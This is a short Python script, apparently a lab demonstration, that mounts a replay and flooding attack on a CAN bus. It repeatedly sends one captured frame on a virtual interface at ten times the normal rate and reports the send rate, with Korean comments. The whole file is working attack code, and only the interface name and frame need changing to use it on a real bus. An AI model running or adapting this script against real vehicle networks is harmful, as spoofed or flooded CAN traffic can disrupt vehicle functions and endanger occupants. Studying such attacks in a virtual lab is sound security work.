import can
import time

bus = can.Bus(channel='vcan0', interface='socketcan')

captured_msg = can.Message(
    arbitration_id=0x100,
    data=[1,2,3,4,5,6,7,8],
    is_extended_id=False
)

NORMAL_PERIOD = 0.1   # 정상 100ms
ATTACK_PERIOD = 0.01  # 공격 10ms

count = 0
start_time = time.time()

print("\n[Replay Attack Started]")
print(f"Normal Period : {NORMAL_PERIOD}s (10 msg/sec)")
print(f"Attack Period : {ATTACK_PERIOD}s (100 msg/sec)")
print("-" * 50)

while True:
    bus.send(captured_msg)
    count += 1

    now = time.time()
    elapsed = now - start_time

    # 1초마다 전송 속도 출력
    if elapsed >= 1.0:
        print(f"[ATTACK] Sent {count} messages/sec "
              f"(≈ {count/10:.1f}x faster than normal)")
        count = 0
        start_time = now

    time.sleep(ATTACK_PERIOD)